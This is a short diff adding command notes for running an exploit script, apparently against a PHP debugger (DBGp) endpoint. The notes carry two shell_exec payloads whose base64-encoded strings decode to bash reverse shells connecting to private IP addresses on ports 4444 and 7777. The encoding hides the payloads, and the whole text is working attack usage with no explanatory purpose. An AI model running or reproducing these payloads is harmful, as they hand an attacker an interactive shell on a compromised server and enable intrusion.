@@ -1,0 +1,6 @@
+python3 exp.py -t http://127.0.0.1:9090/index.php -c
+'shell_exec("echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMzEvNDQ0NCAwPiYxCg==' > shell.sh & cat shell.sh | base64 -d | bash");'
+'shell_exec("echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4yLzc3NzcgMD4mMQo=' > shell.sh & cat shell.sh | base64 -d | bash");'
+
+
+--dbgp-ip 192.168.1.31
